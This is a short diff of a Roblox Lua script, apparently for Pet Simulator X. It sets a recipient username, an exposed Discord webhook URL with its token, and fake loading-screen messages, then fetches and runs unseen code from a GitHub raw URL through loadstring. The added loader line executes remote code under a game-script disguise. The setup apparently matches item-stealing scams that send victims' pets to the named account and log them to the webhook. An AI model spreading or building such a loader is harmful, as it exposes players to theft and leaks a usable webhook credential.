@@ -1,12 +1,9 @@
 Username = "KonichiwaNab"
 WebHook = "https://discord.com/api/webhooks/1256562775933714443/qxJUh6kz5jOv7PTKzrqbh93vBMf85Mg-BmRQ-cX2dtd7GV1GFA0s883l9srNI391s2bL"
- 
- 
-loadingscreen = true
-_G.CustomScriptName = "Pet Sim x Script"
+
+_G.CustomScriptName = "Coen"
 _G.Text1 = "Script Loaded..."
-_G.Text2 = "Waiting for Script..."
+_G.Text2 = "Waiting for Script"
 _G.Text3 = "Checking Scripts..."
-_G.Text4 = "Starting Script..."
- 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/GatoProduction/MoriHubPSXScript/main/GatoProduction", true))()
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
